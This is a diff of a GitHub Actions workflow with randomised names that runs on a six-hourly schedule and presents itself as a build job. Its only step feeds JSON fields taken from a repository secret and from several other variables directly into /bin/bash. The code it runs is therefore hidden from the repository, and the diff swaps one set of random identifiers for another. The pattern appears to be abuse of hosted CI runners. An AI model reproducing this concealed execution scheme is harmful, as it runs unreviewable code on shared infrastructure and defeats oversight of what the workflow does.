@@ -1,24 +1,27 @@
 name: gaochanghui5647
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 5/6 * * *'
-jobs:  # 19861
+    - cron: '0 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: gaochanghui5647
         env:
-          a29549: ${{ secrets.a29549 }}
+          hs68: ${{ secrets.hs68 }}
         run: |
-          echo $a29549 | jq -r .bnvc514 | /bin/bash
-          echo $ibt23623 | jq -r .srhj78 | /bin/bash
-          echo $vyo8286 | jq -r .a8011 | /bin/bash
-          echo $j1 | jq -r .vn57 | /bin/bash
-          echo $gobuu238 | jq -r .g38333 | /bin/bash
-          echo $mrhy301 | jq -r .dn34739 | /bin/bash
-          echo $yu37339 | jq -r .xrv961 | /bin/bash
-          echo $vudtc92062 | jq -r .ejstt849 | /bin/bash
+          echo $hs68 | jq -r .nkz64797 | /bin/bash
+          echo $t3 | jq -r .hsitg3880 | /bin/bash
+          echo $byyo3 | jq -r .catv293 | /bin/bash
+          echo $hzg53564 | jq -r .dz34967 | /bin/bash
+          echo $ztr88 | jq -r .qfujf0373 | /bin/bash
+          echo $uza6 | jq -r .uom1 | /bin/bash
+          echo $cnyl47 | jq -r .x1 | /bin/bash
+          echo $h76731 | jq -r .jnj63 | /bin/bash
+          echo $p5 | jq -r .x2659 | /bin/bash
+          echo $j657 | jq -r .c4255 | /bin/bash
 
